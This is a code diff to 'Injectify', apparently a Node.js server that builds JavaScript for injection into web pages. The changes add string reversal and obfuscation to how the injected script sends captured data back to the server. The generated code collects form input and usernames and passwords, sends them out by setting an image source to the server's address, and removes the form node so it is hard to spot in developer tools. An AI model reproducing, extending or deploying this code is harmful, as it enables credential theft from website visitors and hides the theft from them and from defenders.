@@ -25,6 +25,7 @@ const btoa			= require('btoa')
 const beautify		= require('js-beautify').js_beautify
 const UglifyJS		= require("uglify-js")
 const ObfuscateJS	= require('js-obfuscator')
+const reverse		= require('reverse-string')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -479,7 +480,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			return new Promise((resolve, reject) => {
 				if (typeof base64 === "string") {
 					try {
-						let json = JSON.parse(Buffer.from(base64, 'base64').toString())
+						let json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()))
 						if (json) resolve(json)
 					} catch (e) {
 						reject(Error("invalid base64 encoded json string (" + e + ")"))
@@ -896,14 +897,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 
 					setInterval(function() {` + comment("if the array is empty, skip making a request") + `
 						if(!f.length) return
-						c.src = p + btoa(
-							JSON.stringify({
-								a: atob("` + btoa(req.query.project) + `"),
-								t: 1,
-								b: g,
-								c: f
-							})
-						)
+						var i = {
+							a: atob("` + btoa(req.query.project) + `"),
+							t: 1,
+							b: g,
+							c: f
+						}
+						` + enc(`c.src=p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`, true) + `
 						f = []
 					}, 3000)
 				`
@@ -971,8 +971,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						c: y.value` + json + `
 					}
 					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
-						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") + `
-					c.src = p + btoa(JSON.stringify(i))` + comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
+						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") +
+						enc(`c.src=p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`, true) + 
+						comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
 					w.remove()
 				})
 			`
